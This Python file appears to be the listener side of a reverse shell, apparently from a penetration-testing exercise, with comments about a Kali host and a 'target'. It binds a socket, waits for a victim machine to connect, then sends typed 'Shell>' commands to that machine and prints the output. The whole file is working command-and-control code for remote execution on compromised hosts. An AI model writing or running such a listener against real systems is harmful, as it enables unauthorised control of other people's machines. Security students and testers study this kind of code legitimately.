import socket
from socket_client_server import HOST, PORT


def run_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # start a socket object 's'
    s.bind((HOST, PORT))  # define the kali IP and the listening port
    s.listen(1)  # define the backlog size, since we are expecting a single connection from a target

    print(f"[+] Listening for incoming TCP connection on port {HOST}:{PORT}")
    conn, addr = s.accept()  # accept() function will return the connection object ID (conn) a
    # port in a tuple format (IP,port)
    print(f"[+] We got a connection from: {addr}")

    while True:
        command = input("Shell> ")  # Get user input and store it in command variable
        if 'exit' in command:  # If we got terminate command, inform the client and close
            conn.send('exit'.encode())
            conn.close()
            break
        else:
            conn.send(command.encode())  # Otherwise we will send the command to the target
            print(conn.recv(1024).decode())  # and print the result that we got back


if __name__ == "__main__":
    run_server()
